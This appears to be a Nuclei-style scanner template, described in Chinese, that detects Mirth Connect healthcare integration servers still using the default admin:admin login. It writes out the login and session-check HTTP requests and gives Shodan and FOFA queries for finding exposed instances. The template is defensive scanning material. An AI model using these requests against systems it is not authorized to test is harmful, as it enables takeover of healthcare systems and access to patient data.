id: mirth-connect-default-admin-creds

info:
  name: Mirth Connect 默认管理员凭据漏洞
  author: 0x_Akoko
  severity: high
  description: |
    检测到目标 Mirth Connect 实例使用默认管理员凭据 admin:admin 成功登录。Mirth Connect 是医疗保健领域广泛使用的集成引擎，支持 HL7、FHIR 等医疗数据标准，攻击者可利用该默认凭据获取系统完全控制权限。
  reference:
    - https://www.nextgen.com/products-and-services/integration-engine
    - https://docs.nextgen.com/bundle/Mirth_Connect_v4.4.1/page/connect/connect/topics/c_Getting_Started_mirth_connect_ug.html
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-798
  metadata:
    verified: true
    max-request: 2
    vendor: nextgen
    product: mirth-connect
    shodan-query: 'http.title:"Mirth Connect"'
    fofa-query: 'title="Mirth Connect"'
  tags: NextGen-Mirth-Connect
  remediation: >-
    升级受影响产品至最新的厂商支持版本，并安装所有可用的安全补丁。如果暂时无法升级，应限制对受影响端点的访问，尽可能禁用存在风险的功能，并采取身份认证、网络隔离和请求过滤等补偿性措施。同时检查相关 日志，并轮换可能已暴露的凭据或密钥。

variables:
  username: "admin"
  password: "admin"

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /api/users/_login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded
        X-Requested-With: XMLHttpRequest

        username={{username}}&password={{password}}
    matchers:
      - type: dsl
        internal: true
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "application/xml")'
          - 'contains_all(to_lower(body), "loginstatus", "success")'
        condition: and
    cookie-reuse: true
  - raw:
      - |
        GET /api/users/current HTTP/1.1
        Host: {{Hostname}}
        X-Requested-With: XMLHttpRequest
    matchers:
      - type: dsl
        dsl:
          - 'status_code == 200'
          - 'contains(content_type, "application/xml")'
          - 'contains_all(to_lower(body), "<username>", "admin")'
        condition: and

